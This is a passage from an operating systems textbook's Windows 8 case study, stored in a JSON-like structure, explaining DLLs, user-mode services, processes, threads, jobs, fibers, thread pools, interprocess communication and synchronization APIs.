processes, reduce program load times from disk by keeping com\u0002monly used code around in memory, and increase the serviceability of the system\r\nby allowing operating system library code to be updated without having to recom\u0002pile or relink all the application programs that use it.\r\nOn the other hand, shared libraries introduce the problem of versioning and in\u0002crease the complexity of the system because changes introduced into a shared li\u0002brary to help one particular program have the potential of exposing latent bugs in\r\nother applications, or just breaking them due to changes in the implementation—a\r\nproblem that in the Windows world is referred to as DLL hell.\n906 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nThe implementation of DLLs is simple in concept. Instead of the compiler\r\nemitting code that calls directly to subroutines in the same executable image, a\r\nlevel of indirection is introduced: the IAT (Import Address Table). When an ex\u0002ecutable is loaded it is searched for the list of DLLs that must also be loaded (this\r\nwill be a graph in general, as the listed DLLs will themselves will generally list\r\nother DLLs needed in order to run). The required DLLs are loaded and the IAT is\r\nfilled in for them all.\r\nThe reality is more complicated. Another problem is that the graphs that\r\nrepresent the relationships between DLLs can contain cycles, or have nondetermin\u0002istic behaviors, so computing the list of DLLs to load can result in a sequence that\r\ndoes not work. Also, in Windows the DLL libraries are given a chance to run code\r\nwhenever they are loaded into a process, or when a new thread is created. Gener\u0002ally, this is so they can perform initialization, or allocate per-thread storage, but\r\nmany DLLs perform a lot of computation in these attach routines. If any of the\r\nfunctions called in an attach routine needs to examine the list of loaded DLLs, a\r\ndeadlock can occur, hanging the process.\r\nDLLs are used for more than just sharing common code. They enable a host\u0002ing model for extending applications. Internet Explorer can download and link to\r\nDLLs called ActiveX controls. At the other end of the Internet, Web servers also\r\nload dynamic code to produce a better Web experience for the pages they display.\r\nApplications like Microsoft Office link and run DLLs to allow Office to be used as\r\na platform for building other applications. The COM (component object model)\r\nstyle of programming allows programs to dynamically find and load code written\r\nto provide a particular published interface, which leads to in-process hosting of\r\nDLLs by almost all the applications that use COM.\r\nAll this dynamic loading of code has resulted in even greater complexity for\r\nthe operating system, as library version management is not just a matter of match\u0002ing executables to the right versions of the DLLs, but sometimes loading multiple\r\nversions of the same DLL into a process—which Microsoft calls side-by-side. A\r\nsingle program can host two different dynamic code libraries, each of which may\r\nwant to load the same Windows library—yet have different version requirements\r\nfor that library.\r\nA better solution would be hosting code in separate processes. But out-of--\r\nprocess hosting of code results has lower performance, and makes for a more com\u0002plicated programming model in many cases. Microsoft has yet to develop a good\r\nsolution for all of this complexity in user mode. It makes one yearn for the relative\r\nsimplicity of kernel mode.\r\nOne of the reasons that kernel mode has less complexity than user mode is that\r\nit supports relatively few extensibility opportunities outside of the device-driver\r\nmodel. In Windows, system functionality is extended by writing user-mode ser\u0002vices. This worked well enough for subsystems, and works even better when only\r\na few new services are being provided rather than a complete operating system per\u0002sonality. There are few functional differences between services implemented in the\nSEC. 11.3 SYSTEM STRUCTURE 907\r\nkernel and services implemented in user-mode processes. Both the kernel and\r\nprocess provide private address spaces where data structures can be protected and\r\nservice requests can be scrutinized.\r\nHowever, there can be significant performance differences between services in\r\nthe kernel vs. services in user-mode processes. Entering the kernel from user mode\r\nis slow on modern hardware, but not as slow as having to do it twice because you\r\nare switching back and forth to another process. Also cross-process communica\u0002tion has lower bandwidth.\r\nKernel-mode code can (carefully) access data at the user-mode addresses pas\u0002sed as parameters to its system calls. With user-mode services, either those data\r\nmust be copied to the service process, or some games be played by mapping mem\u0002ory back and forth (the ALPC facilities in Windows handle this under the covers).\r\nIn the future it is possible that the hardware costs of crossing between address\r\nspaces and protection modes will be reduced, or perhaps even become irrelevant.\r\nThe Singularity project in Microsoft Research (Fandrich et al., 2006) uses run-time\r\ntechniques, like those used with C# and Java, to make protection a completely soft\u0002ware issue. No hardware switching between address spaces or protection modes is\r\nrequired.\r\nWindows makes significant use of user-mode service processes to extend the\r\nfunctionality of the system. Some of these services are strongly tied to the opera\u0002tion of kernel-mode components, such as lsass.exe which is the local security\r\nauthentication service which manages the token objects that represent user-identity,\r\nas well as managing encryption keys used by the file system. The user-mode plug\u0002and-play manager is responsible for determining the correct driver to use when a\r\nnew hardware device is encountered, installing it, and telling the kernel to load it.\r\nMany facilities provided by third parties, such as antivirus and digital rights man\u0002agement, are implemented as a combination of kernel-mode drivers and user-mode\r\nservices.\r\nThe Windows taskmgr.exe has a tab which identifies the services running on\r\nthe system. Multiple services can be seen to be running in the same process\r\n(svchost.exe). Windows does this for many of its own boot-time services to reduce\r\nthe time needed to start up the system. Services can be combined into the same\r\nprocess as long as they can safely operate with the same security credentials.\r\nWithin each of the shared service processes, individual services are loaded as\r\nDLLs. They normally share a pool of threads using the Win32 thread-pool facility,\r\nso that only the minimal number of threads needs to be running across all the resi\u0002dent services.\r\nServices are common sources of security vulnerabilities in the system because\r\nthey are often accessible remotely (depending on the TCP/IP firewall and IP Secu\u0002rity settings), and not all programmers who write services are as careful as they\r\nshould be to validate the parameters and buffers that are passed in via RPC.\r\nThe number of services running constantly in Windows is staggering. Yet few\r\nof those services ever receive a single request, though if they do it is likely to be\n908 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nfrom an attacker attempting to exploit a vulnerability. As a result more and more\r\nservices in Windows are turned off by default, particularly on versions of Windows\r\nServer."
          }
        }
      },
      "11.4 PROCESSES AND THREADS IN WINDOWS": {
        "page": 939,
        "children": {
          "11.4.1 Fundamental Concepts": {
            "page": 939,
            "content": "11.4.1 Fundamental Concepts\r\nIn Windows processes are containers for programs. They hold the virtual ad\u0002dress space, the handles that refer to kernel-mode objects, and threads. In their\r\nrole as a container for threads they hold common resources used for thread execu\u0002tion, such as the pointer to the quota structure, the shared token object, and default\r\nparameters used to initialize threads—including the priority and scheduling class.\r\nEach process has user-mode system data, called the PEB (Process Environment\r\nBlock). The PEB includes the list of loaded modules (i.e., the EXE and DLLs),\r\nthe memory containing environment strings, the current working directory, and\r\ndata for managing the process’ heaps—as well as lots of special-case Win32 cruft\r\nthat has been added over time.\r\nThreads are the kernel’s abstraction for scheduling the CPU in Windows. Pri\u0002orities are assigned to each thread based on the priority value in the containing\r\nprocess. Threads can also be affinitized to run only on certain processors. This\r\nhelps concurrent programs running on multicore chips or multiprocessors to expli\u0002citly spread out work. Each thread has two separate call stacks, one for execution\r\nin user mode and one for kernel mode. There is also a TEB (Thread Environ\u0002ment Block) that keeps user-mode data specific to the thread, including per-thread\r\nstorage (Thread Local Storage) and fields for Win32, language and cultural local\u0002ization, and other specialized fields that have been added by various facilities.\r\nBesides the PEBs and TEBs, there is another data structure that kernel mode\r\nshares with each process, namely, user shared data. This is a page that is writable\r\nby the kernel, but read-only in every user-mode process. It contains a number of\r\nvalues maintained by the kernel, such as various forms of time, version infor\u0002mation, amount of physical memory, and a large number of shared flags used by\r\nvarious user-mode components, such as COM, terminal services, and the debug\u0002gers. The use of this read-only shared page is purely a performance optimization,\r\nas the values could also be obtained by a system call into kernel mode. But system\r\ncalls are much more expensive than a single memory access, so for some sys\u0002tem-maintained fields, such as the time, this makes a lot of sense. The other fields,\r\nsuch as the current time zone, change infrequently (except on airborne computers),\nSEC. 11.4 PROCESSES AND THREADS IN WINDOWS 909\r\nbut code that relies on these fields must query them often just to see if they hav e\r\nchanged. As with many performance hacks, it is a bit ugly, but it works.\r\nProcesses\r\nProcesses are created from section objects, each of which describes a memory\r\nobject backed by a file on disk. When a process is created, the creating process re\u0002ceives a handle that allows it to modify the new process by mapping sections, allo\u0002cating virtual memory, writing parameters and environmental data, duplicating file\r\ndescriptors into its handle table, and creating threads. This is very different than\r\nhow processes are created in UNIX and reflects the difference in the target systems\r\nfor the original designs of UNIX vs. Windows.\r\nAs described in Sec. 11.1, UNIX was designed for 16-bit single-processor sys\u0002tems that used swapping to share memory among processes. In such systems, hav\u0002ing the process as the unit of concurrency and using an operation like fork to create\r\nprocesses was a brilliant idea. To run a new process with small memory and no\r\nvirtual memory hardware, processes in memory have to be swapped out to disk to\r\ncreate space. UNIX originally implemented fork simply by swapping out the par\u0002ent process and handing its physical memory to the child. The operation was al\u0002most free.\r\nIn contrast, the hardware environment at the time Cutler’s team wrote NT was\r\n32-bit multiprocessor systems with virtual memory hardware to share 1–16 MB of\r\nphysical memory. Multiprocessors provide the opportunity to run parts of pro\u0002grams concurrently, so NT used processes as containers for sharing memory and\r\nobject resources, and used threads as the unit of concurrency for scheduling.\r\nOf course, the systems of the next few years will look nothing like either of\r\nthese target environments, having 64-bit address spaces with dozens (or hundreds)\r\nof CPU cores per chip socket and dozens or hundreds gigabytes of physical memo\u0002ry. This memory may be radically different from current RAM as well. Current\r\nRAM loses its contents when powered off, but phase-change memories now in\r\nthe pipeline keep their values (like disks) even when powered off. Also expect\r\nflash devices to replace hard disks, broader support for virtualization, ubiquitous\r\nnetworking, and support for synchronization innovations like transactional mem\u0002ory. Windows and UNIX will continue to be adapted to new hardware realities,\r\nbut what will be really interesting is to see what new operating systems are de\u0002signed specifically for systems based on these advances.\r\nJobs and Fibers\r\nWindows can group processes together into jobs. Jobs group processes in\r\norder to apply constraints to them and the threads they contain, such as limiting re\u0002source use via a shared quota or enforcing a restricted token that prevents threads\r\nfrom accessing many system objects. The most significant property of jobs for\n910 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nresource management is that once a process is in a job, all processes’ threads in\r\nthose processes create will also be in the job. There is no escape. As suggested by\r\nthe name, jobs were designed for situations that are more like batch processing\r\nthan ordinary interactive computing.\r\nIn Modern Windows, jobs are used to group together the processes that are ex\u0002ecuting a modern application. The processes that comprise a running application\r\nneed to be identified to the operating system so it can manage the entire application\r\non behalf of the user.\r\nFigure 11-22 shows the relationship between jobs, processes, threads, and\r\nfibers. Jobs contain processes. Processes contain threads. But threads do not con\u0002tain fibers. The relationship of threads to fibers is normally many-to-many.\r\njob\r\nprocess process\r\nthread thread thread thread thread\r\nfiber fiber fiber fiber fiber fiber fiber fiber\r\nFigure 11-22. The relationship between jobs, processes, threads, and fibers.\r\nJobs and fibers are optional; not all processes are in jobs or contain fibers.\r\nFibers are created by allocating a stack and a user-mode fiber data structure for\r\nstoring registers and data associated with the fiber. Threads are converted to fibers,\r\nbut fibers can also be created independently of threads. Such a fiber will not run\r\nuntil a fiber already running on a thread explicitly calls SwitchToFiber to run the\r\nfiber. Threads could attempt to switch to a fiber that is already running, so the pro\u0002grammer must provide synchronization to prevent this.\r\nThe primary advantage of fibers is that the overhead of switching between\r\nfibers is much lower than switching between threads. A thread switch requires\r\nentering and exiting the kernel. A fiber switch saves and restores a few registers\r\nwithout changing modes at all.\r\nAlthough fibers are cooperatively scheduled, if there are multiple threads\r\nscheduling the fibers, a lot of careful synchronization is required to make sure\r\nfibers do not interfere with each other. To simplify the interaction between threads\r\nand fibers, it is often useful to create only as many threads as there are processors\r\nto run them, and affinitize the threads to each run only on a distinct set of available\r\nprocessors, or even just one processor.\r\nEach thread can then run a particular subset of the fibers, establishing a one-to\u0002many relationship between threads and fibers which simplifies synchronization.\r\nEven so there are still many difficulties with fibers. Most of the Win32 libraries\nSEC. 11.4 PROCESSES AND THREADS IN WINDOWS 911\r\nare completely unaware of fibers, and applications that attempt to use fibers as if\r\nthey were threads will encounter various failures. The kernel has no knowledge of\r\nfibers, and when a fiber enters the kernel, the thread it is executing on may block\r\nand the kernel will schedule an arbitrary thread on the processor, making it\r\nunavailable to run other fibers. For these reasons fibers are rarely used except\r\nwhen porting code from other systems that explicitly need the functionality pro\u0002vided by fibers.\r\nThread Pools and User-Mode Scheduling\r\nThe Win32 thread pool is a facility that builds on top of the Windows thread\r\nmodel to provide a better abstraction for certain types of programs. Thread crea\u0002tion is too expensive to be inv oked every time a program wants to execute a small\r\ntask concurrently with other tasks in order to take advantage of multiple proc\u0002essors. Tasks can be grouped together into larger tasks but this reduces the amount\r\nof exploitable concurrency in the program. An alternative approach is for a pro\u0002gram to allocate a limited number of threads, and maintain a queue of tasks that\r\nneed to be run. As a thread finishes the execution of a task, it takes another one\r\nfrom the queue. This model separates the resource-management issues (how many\r\nprocessors are available and how many threads should be created) from the pro\u0002gramming model (what is a task and how are tasks synchronized). Windows for\u0002malizes this solution into the Win32 thread pool, a set of APIs for automatically\r\nmanaging a dynamic pool of threads and dispatching tasks to them.\r\nThread pools are not a perfect solution, because when a thread blocks for some\r\nresource in the middle of a task, the thread cannot switch to a different task. Thus,\r\nthe thread pool will inevitably create more threads than there are processors avail\u0002able, so if runnable threads are available to be scheduled even when other threads\r\nhave blocked. The thread pool is integrated with many of the common synchroni\u0002zation mechanisms, such as awaiting the completion of I/O or blocking until a ker\u0002nel event is signaled. Synchronization can be used as triggers for queuing a task so\r\nthreads are not assigned the task before it is ready to run.\r\nThe implementation of the thread pool uses the same queue facility provided\r\nfor synchronization with I/O completion, together with a kernel-mode thread fac\u0002tory which adds more threads to the process as needed to keep the available num\u0002ber of processors busy. Small tasks exist in many applications, but particularly in\r\nthose that provide services in the client/server model of computing, where a stream\r\nof requests are sent from the clients to the server. Use of a thread pool for these\r\nscenarios improves the efficiency of the system by reducing the overhead of creat\u0002ing threads and moving the decisions about how to manage the threads in the pool\r\nout of the application and into the operating system.\r\nWhat programmers see as a single Windows thread is actually two threads: one\r\nthat runs in kernel mode and one that runs in user mode. This is precisely the same\n912 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nmodel that UNIX has. Each of these threads is allocated its own stack and its own\r\nmemory to save its registers when not running. The two threads appear to be a sin\u0002gle thread because they do not run at the same time. The user thread operates as an\r\nextension of the kernel thread, running only when the kernel thread switches to it\r\nby returning from kernel mode to user mode. When a user thread wants to perform\r\na system call, encounters a page fault, or is preempted, the system enters kernel\r\nmode and switches back to the corresponding kernel thread. It is normally not pos\u0002sible to switch between user threads without first switching to the corresponding\r\nkernel thread, switching to the new kernel thread, and then switching to its user\r\nthread.\r\nMost of the time the difference between user and kernel threads is transparent\r\nto the programmer. Howev er, in Windows 7 Microsoft added a facility called\r\nUMS (User-Mode Scheduling), which exposes the distinction. UMS is similar to\r\nfacilities used in other operating systems, such as scheduler activations. It can be\r\nused to switch between user threads without first having to enter the kernel, provid\u0002ing the benefits of fibers, but with much better integration into Win32—since it\r\nuses real Win32 threads.\r\nThe implementation of UMS has three key elements:\r\n1. User-mode switching: a user-mode scheduler can be written to switch\r\nbetween user threads without entering the kernel. When a user thread\r\ndoes enter kernel mode, UMS will find the corresponding kernel\r\nthread and immediately switch to it.\r\n2. Reentering the user-mode scheduler: when the execution of a kernel\r\nthread blocks to await the availability of a resource, UMS switches to\r\na special user thread and executes the user-mode scheduler so that a\r\ndifferent user thread can be scheduled to run on the current processor.\r\nThis allows the current process to continue using the current proc\u0002essor for its full turn rather than having to get in line behind other\r\nprocesses when one of its threads blocks.\r\n3. System-call completion: after a blocked kernel thread eventually is\r\nfinished, a notification containing the results of the system calls is\r\nqueued for the user-mode scheduler so that it can switch to the corres\u0002ponding user thread next time it makes a scheduling decision.\r\nUMS does not include a user-mode scheduler as part of Windows. UMS is in\u0002tended as a low-level facility for use by run-time libraries used by programming\u0002language and server applications to implement lightweight threading models that\r\ndo not conflict with kernel-level thread scheduling. These run-time libraries will\r\nnormally implement a user-mode scheduler best suited to their environment. A\r\nsummary of these abstractions is given in Fig. 11-23.\nSEC. 11.4 PROCESSES AND THREADS IN WINDOWS 913\r\nName Description Notes\r\nJob Collection of processes that share quotas and limits Used in AppContainers\r\nProcess Container for holding resources\r\nThread Entity scheduled by the ker nel\r\nFiber Lightweight thread managed entirely in user space Rarely used\r\nThread pool Task-or iented programming model Built on top of threads\r\nUser-mode thread Abstraction allowing user-mode thread switching An extension of threads\r\nFigure 11-23. Basic concepts used for CPU and resource management.\r\nThreads\r\nEvery process normally starts out with one thread, but new ones can be created\r\ndynamically. Threads form the basis of CPU scheduling, as the operating system\r\nalways selects a thread to run, not a process. Consequently, every thread has a\r\nstate (ready, running, blocked, etc), whereas processes do not have scheduling\r\nstates. Threads can be created dynamically by a Win32 call that specifies the ad\u0002dress within the enclosing process’ address space at which it is to start running.\r\nEvery thread has a thread ID, which is taken from the same space as the proc\u0002ess IDs, so a single ID can never be in use for both a process and a thread at the\r\nsame time. Process and thread IDs are multiples of four because they are actually\r\nallocated by the executive using a special handle table set aside for allocating IDs.\r\nThe system is reusing the scalable handle-management facility shown in\r\nFigs. 11-16 and 11-17. The handle table does not have references on objects, but\r\ndoes use the pointer field to point at the process or thread so that the lookup of a\r\nprocess or thread by ID is very efficient. FIFO ordering of the list of free handles\r\nis turned on for the ID table in recent versions of Windows so that IDs are not im\u0002mediately reused. The problems with immediate reuse are explored in the prob\u0002lems at the end of this chapter.\r\nA thread normally runs in user mode, but when it makes a system call it\r\nswitches to kernel mode and continues to run as the same thread with the same\r\nproperties and limits it had in user mode. Each thread has two stacks, one for use\r\nwhen it is in user mode and one for use when it is in kernel mode. Whenever a\r\nthread enters the kernel, it switches to the kernel-mode stack. The values of the\r\nuser-mode registers are saved in a CONTEXT data structure at the base of the ker\u0002nel-mode stack. Since the only way for a user-mode thread to not be running is for\r\nit to enter the kernel, the CONTEXT for a thread always contains its register state\r\nwhen it is not running. The CONTEXT for each thread can be examined and mod\u0002ified from any process with a handle to the thread.\r\nThreads normally run using the access token of their containing process, but in\r\ncertain cases related to client/server computing, a thread running in a service proc\u0002ess can impersonate its client, using a temporary access token based on the client’s\n914 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\ntoken so it can perform operations on the client’s behalf. (In general a service can\u0002not use the client’s actual token, as the client and server may be running on dif\u0002ferent systems.)\r\nThreads are also the normal focal point for I/O. Threads block when perform\u0002ing synchronous I/O, and the outstanding I/O request packets for asynchronous I/O\r\nare linked to the thread. When a thread is finished executing, it can exit. Any I/O\r\nrequests pending for the thread will be canceled. When the last thread still active\r\nin a process exits, the process terminates.\r\nIt is important to realize that threads are a scheduling concept, not a re\u0002source-ownership concept. Any thread is able to access all the objects that belong\r\nto its process. All it has to do is use the handle value and make the appropriate\r\nWin32 call. There is no restriction on a thread that it cannot access an object be\u0002cause a different thread created or opened it. The system does not even keep track\r\nof which thread created which object. Once an object handle has been put in a\r\nprocess’ handle table, any thread in the process can use it, even it if is impersonat\u0002ing a different user.\r\nAs described previously, in addition to the normal threads that run within user\r\nprocesses Windows has a number of system threads that run only in kernel mode\r\nand are not associated with any user process. All such system threads run in a spe\u0002cial process called the system process. This process does not have a user-mode\r\naddress space. It provides the environment that threads execute in when they are\r\nnot operating on behalf of a specific user-mode process. We will study some of\r\nthese threads later when we come to memory management. Some perform admin\u0002istrative tasks, such as writing dirty pages to the disk, while others form the pool of\r\nworker threads that are assigned to run specific short-term tasks delegated by exec\u0002utive components or drivers that need to get some work done in the system process."
          },
          "11.4.2 Job, Process, Thread, and Fiber Management API Calls": {
            "page": 945,
            "content": "11.4.2 Job, Process, Thread, and Fiber Management API Calls\r\nNew processes are created using the Win32 API function CreateProcess. This\r\nfunction has many parameters and lots of options. It takes the name of the file to\r\nbe executed, the command-line strings (unparsed), and a pointer to the environ\u0002ment strings. There are also flags and values that control many details such as how\r\nsecurity is configured for the process and first thread, debugger configuration, and\r\nscheduling priorities. A flag also specifies whether open handles in the creator are\r\nto be passed to the new process. The function also takes the current working direc\u0002tory for the new process and an optional data structure with information about the\r\nGUI Window the process is to use. Rather than returning just a process ID for the\r\nnew process, Win32 returns both handles and IDs, both for the new process and for\r\nits initial thread.\r\nThe large number of parameters reveals a number of differences from the de\u0002sign of process creation in UNIX.\nSEC. 11.4 PROCESSES AND THREADS IN WINDOWS 915\r\n1. The actual search path for finding the program to execute is buried in\r\nthe library code for Win32, but managed more explicitly in UNIX.\r\n2. The current working directory is a kernel-mode concept in UNIX but\r\na user-mode string in Windows. Windows does open a handle on the\r\ncurrent directory for each process, with the same annoying effect as in\r\nUNIX: you cannot delete the directory, unless it happens to be across\r\nthe network, in which case you can delete it.\r\n3. UNIX parses the command line and passes an array of parameters,\r\nwhile Win32 leaves argument parsing up to the individual program.\r\nAs a consequence, different programs may handle wildcards (e.g.,\r\n*.txt) and other special symbols in an inconsistent way.\r\n4. Whether file descriptors can be inherited in UNIX is a property of the\r\nhandle. In Windows it is a property of both the handle and a parame\u0002ter to process creation.\r\n5. Win32 is GUI oriented, so new processes are directly passed infor\u0002mation about their primary window, while this information is passed\r\nas parameters to GUI applications in UNIX.\r\n6. Windows does not have a SETUID bit as a property of the executable,\r\nbut one process can create a process that runs as a different user, as\r\nlong as it can obtain a token with that user’s credentials.\r\n7. The process and thread handle returned from Windows can be used at\r\nany time to modify the new process/thread in many substantive ways,\r\nincluding modifying the virtual memory, injecting threads into the\r\nprocess, and altering the execution of threads. UNIX makes modifi\u0002cations to the new process only between the fork and exec calls, and\r\nonly in limited ways as exec throws out all the user-mode state of the\r\nprocess.\r\nSome of these differences are historical and philosophical. UNIX was de\u0002signed to be command-line oriented rather than GUI oriented like Windows.\r\nUNIX users are more sophisticated, and they understand concepts like PA TH vari\u0002ables. Windows inherited a lot of legacy from MS-DOS.\r\nThe comparison is also skewed because Win32 is a user-mode wrapper around\r\nthe native NT process execution, much as the system library function wraps\r\nfork/exec in UNIX. The actual NT system calls for creating processes and threads,\r\nNtCreateProcess and NtCreateThread, are simpler than the Win32 versions. The\r\nmain parameters to NT process creation are a handle on a section representing the\r\nprogram file to run, a flag specifying whether the new process should, by default,\r\ninherit handles from the creator, and parameters related to the security model. All\r\nthe details of setting up the environment strings and creating the initial thread are\n916 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nleft to user-mode code that can use the handle on the new process to manipulate its\r\nvirtual address space directly.\r\nTo support the POSIX subsystem, native process creation has an option to cre\u0002ate a new process by copying the virtual address space of another process rather\r\nthan mapping a section object for a new program. This is used only to implement\r\nfork for POSIX, and not by Win32. Since POSIX no longer ships with Windows,\r\nprocess duplication has little use—though sometimes enterprising developers come\r\nup with special uses, similar to uses of fork without exec in UNIX.\r\nThread creation passes the CPU context to use for the new thread (which in\u0002cludes the stack pointer and initial instruction pointer), a template for the TEB, and\r\na flag saying whether the thread should be immediately run or created in a sus\u0002pended state (waiting for somebody to call NtResumeThread on its handle). Crea\u0002tion of the user-mode stack and pushing of the argv/argc parameters is left to user\u0002mode code calling the native NT memory-management APIs on the process hand\u0002le.\r\nIn the Windows Vista release, a new native API for processes, NtCreateUser\u0002Process, was added which moves many of the user-mode steps into the kernel\u0002mode executive, and combines process creation with creation of the initial thread.\r\nThe reason for the change was to support the use of processes as security bound\u0002aries. Normally, all processes created by a user are considered to be equally trust\u0002ed. It is the user, as represented by a token, that determines where the trust bound\u0002ary is. NtCreateUserProcess allows processes to also provide trust boundaries, but\r\nthis means that the creating process does not have sufficient rights regarding a new\r\nprocess handle to implement the details of process creation in user mode for proc\u0002esses that are in a different trust environment. The primary use of a process in a\r\ndifferent trust boundary (called protected processes) is to support forms of digital\r\nrights management, which protect copyrighted material from being used improp\u0002erly. Of course, protected processes only target user-mode attacks against protect\u0002ed content and cannot prevent kernel-mode attacks.\r\nInterprocess Communication\r\nThreads can communicate in a wide variety of ways, including pipes, named\r\npipes, mailslots, sockets, remote procedure calls, and shared files. Pipes have two\r\nmodes: byte and message, selected at creation time. Byte-mode pipes work the\r\nsame way as in UNIX. Message-mode pipes are somewhat similar but preserve\r\nmessage boundaries, so that four writes of 128 bytes will be read as four 128-byte\r\nmessages, and not as one 512-byte message, as might happen with byte-mode\r\npipes. Named pipes also exist and have the same two modes as regular pipes.\r\nNamed pipes can also be used over a network but regular pipes cannot.\r\nMailslots are a feature of the now-defunct OS/2 operating system imple\u0002mented in Windows for compatibility. They are similar to pipes in some ways, but\r\nnot all. For one thing, they are one way, whereas pipes are two way. They could\nSEC. 11.4 PROCESSES AND THREADS IN WINDOWS 917\r\nbe used over a network but do not provide guaranteed delivery. Finally, they allow\r\nthe sending process to broadcast a message to many receivers, instead of to just\r\none receiver. Both mailslots and named pipes are implemented as file systems in\r\nWindows, rather than executive functions. This allows them to be accessed over\r\nthe network using the existing remote file-system protocols.\r\nSockets are like pipes, except that they normally connect processes on dif\u0002ferent machines. For example, one process writes to a socket and another one on a\r\nremote machine reads from it. Sockets can also be used to connect processes on\r\nthe same machine, but since they entail more overhead than pipes, they are gener\u0002ally only used in a networking context. Sockets were originally designed for\r\nBerkeley UNIX, and the implementation was made widely available. Some of the\r\nBerkeley code and data structures are still present in Windows today, as acknow\u0002ledged in the release notes for the system.\r\nRPCs are a way for process A to have process B call a procedure in B’s address\r\nspace on A’s behalf and return the result to A. Various restrictions on the parame\u0002ters exist. For example, it makes no sense to pass a pointer to a different process,\r\nso data structures have to be packaged up and transmitted in a nonprocess-specific\r\nway. RPC is normally implemented as an abstraction layer on top of a transport\r\nlayer. In the case of Windows, the transport can be TCP/IP sockets, named pipes,\r\nor ALPC. ALPC (Advanced Local Procedure Call) is a message-passing facility in\r\nthe kernel-mode executive. It is optimized for communicating between processes\r\non the local machine and does not operate across the network. The basic design is\r\nfor sending messages that generate replies, implementing a lightweight version of\r\nremote procedure call which the RPC package can build on top of to provide a\r\nricher set of features than available in ALPC. ALPC is implemented using a com\u0002bination of copying parameters and temporary allocation of shared memory, based\r\non the size of the messages.\r\nFinally, processes can share objects. This includes section objects, which can\r\nbe mapped into the virtual address space of different processes at the same time.\r\nAll writes done by one process then appear in the address spaces of the other proc\u0002esses. Using this mechanism, the shared buffer used in producer-consumer prob\u0002lems can easily be implemented.\r\nSynchronization\r\nProcesses can also use various types of synchronization objects. Just as Win\u0002dows provides numerous interprocess communication mechanisms, it also provides\r\nnumerous synchronization mechanisms, including semaphores, mutexes, critical\r\nregions, and events. All of these mechanisms work with threads, not processes, so\r\nthat when a thread blocks on a semaphore, other threads in that process (if any) are\r\nnot affected and can continue to run.\r\nA semaphore can be created using the CreateSemaphore Win32 API function,\r\nwhich can also initialize it to a given value and define a maximum value as well.\n918 CASE STUDY 2: WINDOWS 8 CHAP. 11\r\nSemaphores are kernel-mode objects and thus have security descriptors and hand\u0002les. The handle for a semaphore can be duplicated using DuplicateHandle and pas\u0002sed to another process so that multiple processes can synchronize on the same sem\u0002aphore. A semaphore can also be given a name in the Win32 namespace and have\r\nan ACL set to protect it. Sometimes sharing a semaphore by name is more ap\u0002propriate than duplicating the handle.\r\nCalls for up and down exist, although they hav e the somewhat odd names of\r\nReleaseSemaphore (up) and WaitForSingleObject (down). It is also possible to\r\ngive WaitForSingleObject a timeout, so the calling thread can be released eventual\u0002ly, even if the semaphore remains at 0 (although timers reintroduce races). Wait\u0002ForSingleObject and WaitForMultipleObjects are the common interfaces used for\r\nwaiting on the dispatcher objects discussed in Sec. 11.3. While it would have been\r\npossible to wrap the single-object version of these APIs in a wrapper with a some\u0002what more semaphore-friendly name, many threads use the multiple-object version\r\nwhich may include waiting for multiple flavors of synchronization objects as well\r\nas other events like process or thread termination, I/O completion, and messages\r\nbeing available on sockets and ports.\r\nMutexes are also kernel-mode objects used for synchronization, but simpler\r\nthan semaphores because they do not have counters. They are essentially locks,\r\nwith API functions for locking WaitForSingleObject and unlocking ReleaseMutex.\r\nLike semaphore handles, mutex handles can be duplicated and passed between\r\nprocesses so that threads in different processes can access the same mutex.\r\nA third synchronization mechanism is called critical sections, which imple\u0002ment the concept of critical regions. These are similar to mutexes in Windows, ex\u0002cept local to the address space of the creating thread. Because critical sections are\r\nnot kernel-mode objects, they do not have explicit handles or security descriptors\r\nand cannot be passed between processes. Locking and unlocking are done with\r\nEnterCr iticalSection and LeaveCr iticalSection, respectively. Because these API\r\nfunctions are performed initially in user space and make kernel calls only when\r\nblocking is needed, they are much faster than mutexes. Critical sections are opti\u0002mized to combine spin locks (on multiprocessors) with the use of kernel synchroni\u0002zation only when necessary. In many applications most critical sections are so\r\nrarely contended or have such short hold times that it is never necessary to allocate\r\na kernel synchronization object. This results in a very significant savings in kernel\r\nmemory.\r\nAnother synchronization mechanism we discuss uses kernel-mode objects call\u0002ed ev ents. As we hav e described previously, there are two kinds: notification\r\nev ents and synchronization events. An event can be in one of two states: signaled\r\nor not-signaled. A thread can wait for an event to be signaled with WaitForSin\u0002gleObject. If another thread signals an event with SetEvent, what happens depends\r\non the type of event. With a notification event, all waiting threads are released and\r\nthe event stays set until manually cleared with ResetEvent. With a synchroniza\u0002tion event, if one or more threads are waiting, exactly one thread is released and\nSEC. 11.4 PROCESSES AND THREADS IN WINDOWS 919\r\nthe event is cleared. An alternative operation is PulseEvent, which is like SetEvent\r\nexcept that if nobody is waiting, the pulse is lost and the event is cleared. In con\u0002trast, a SetEvent that occurs with no waiting threads is remembered by leaving the\r\nev ent in the signaled state so a subsequent thread that calls a wait API for the event\r\nwill not actually wait.\r\nThe number of Win32 API calls dealing with processes, threads, and fibers is\r\nnearly 100, a substantial number of which deal with IPC in one form or another.\r\nTw o new synchronization primitives were recently added to Windows, WaitOn\u0002Address and InitOnceExecuteOnce. WaitOnAddress is called to wait for the value\r\nat the specified address to be modified. The application must call either Wake\u0002ByAddressSingle (or WakeByAddressAll) after modifying the location to wake ei\u0002ther the first (or all) of the threads that called WaitOnAddress on that location. The\r\nadvantage of this API over using events is that it is not necessary to allocate an ex\u0002plicit event for synchronization. Instead, the system hashes the address of the loca\u0002tion to find a list of all the waiters for changes to a given address. WaitOnAddress\r\nfunctions similar to the sleep/wakeup mechanism found in the UNIX kernel. Ini\u0002tOnceExecuteOnce can be used to ensure that an initialization routine is run only\r\nonce in a program. Correct initialization of data structures is surprisingly hard in\r\nmultithreaded programs. A summary of the synchronization primitives discussed\r\nabove, as well as some other important ones, is given in Fig. 11-24.\r\nNote that not all of these are just system calls. While some are wrappers, oth\u0002ers contain significant library code which maps the Win32 semantics onto the\r\nnative NT APIs. Still others, like the fiber APIs, are purely user-mode functions\r\nsince, as we mentioned earlier, kernel mode in Windows knows nothing about\r\nfibers. They are entirely implemented by user-mode libraries."
          },
          "11.4.3 Implementation of Processes and Threads": {
            "page": 950,
